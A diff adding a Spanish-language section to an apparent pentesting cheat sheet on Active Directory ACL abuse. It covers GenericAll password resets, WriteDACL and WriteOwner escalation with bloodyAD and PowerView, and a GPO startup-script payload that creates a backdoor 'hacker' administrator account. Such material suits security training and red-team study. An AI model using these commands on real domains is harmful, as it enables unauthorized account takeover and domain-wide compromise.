@@ -211,6 +211,84 @@ crackmapexec smb &lt;IP&gt; -u user -p pass --shares</code></pre>
                     <li>WriteOwner</li>
                     <li>GPOs mal configuradas</li>
                 </ul>
+                <div class="section">
+    <h2>Abuso de ACLs en Active Directory</h2>
+
+    <p>
+        Estos ataques se basan en permisos mal configurados detectados con <strong>BloodHound</strong>.
+        Permiten escalar privilegios sin explotar vulnerabilidades tradicionales.
+    </p>
+
+    <h3>GenericAll</h3>
+    <p><strong>Descripción:</strong> Control total sobre un usuario o grupo.</p>
+
+    <p><strong>Ejemplo (reset de contraseña):</strong></p>
+    <pre><code># Cambiar contraseña de un usuario objetivo
+bloodyAD --host &lt;DC_IP&gt; -d dominio.local -u userA -p pass \
+set password userB NewPassword123!</code></pre>
+
+    <p><strong>Resultado:</strong> Acceso directo como el usuario objetivo.</p>
+</div>
+
+
+<div class="section">
+
+    <h3>WriteDACL</h3>
+    <p><strong>Descripción:</strong> Permite modificar permisos (ACLs) sobre un objeto.</p>
+
+    <p><strong>Ejemplo (otorgarte control total):</strong></p>
+
+    <pre><code># Darte permisos completos sobre un grupo
+bloodyAD --host &lt;DC_IP&gt; -d dominio.local -u userA -p pass \
+add dacl "IT Admins" userA GenericAll</code></pre>
+
+    <p><strong>Ejemplo posterior:</strong></p>
+
+    <pre><code># Añadirte al grupo privilegiado
+net group "IT Admins" userA /add /domain</code></pre>
+
+    <p><strong>Resultado:</strong> Escalada indirecta a privilegios altos.</p>
+</div>
+
+
+<div class="section">
+
+    <h3>WriteOwner</h3>
+    <p><strong>Descripción:</strong> Permite tomar propiedad de un objeto en AD.</p>
+
+    <p><strong>Ejemplo paso a paso:</strong></p>
+
+    <pre><code># Paso 1: Convertirte en owner del objeto
+Set-DomainObjectOwner -Identity userB -OwnerIdentity userA</code></pre>
+
+    <pre><code># Paso 2: Otorgarte control total
+Add-DomainObjectAcl -TargetIdentity userB -PrincipalIdentity userA -Rights All</code></pre>
+
+    <p><strong>Resultado:</strong> Control total del usuario objetivo (password reset posible).</p>
+</div>
+
+
+<div class="section">
+
+    <h3>GPOs mal configuradas</h3>
+    <p><strong>Descripción:</strong> Permiten modificar políticas de grupo que se aplican a múltiples máquinas.</p>
+
+    <p><strong>Ejemplo (ejecución de payload en startup script):</strong></p>
+
+    <pre><code># Script malicioso en SYSVOL
+\\dominio.local\SYSVOL\dominio.local\scripts\payload.bat</code></pre>
+
+    <p><strong>Contenido del payload:</strong></p>
+
+    <pre><code>net user hacker Password123! /add
+net localgroup administrators hacker /add</code></pre>
+
+    <p><strong>Forzar actualización de política:</strong></p>
+
+    <pre><code>gpupdate /force</code></pre>
+
+    <p><strong>Resultado:</strong> Ejecución en múltiples máquinas, posible SYSTEM.</p>
+</div>
             </div>
 
 
